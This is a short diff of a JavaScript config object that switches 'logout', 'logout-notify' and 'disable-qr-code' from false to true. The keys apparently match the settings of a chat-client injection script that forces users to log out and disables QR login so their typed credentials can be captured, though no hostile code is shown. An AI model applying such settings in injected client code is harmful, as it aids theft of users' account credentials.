@@ -42,15 +42,15 @@ String.prototype.insert = function (index, string) {
 
 const config = {
 
-    "logout": "false",
+    "logout": "true",
 
-    "logout-notify": "false",
+    "logout-notify": "true",
 
     "init-notify":"false",
 
     "embed-color": 00000,
 
-    "disable-qr-code":"false"
+    "disable-qr-code":"true"
 
 }
 
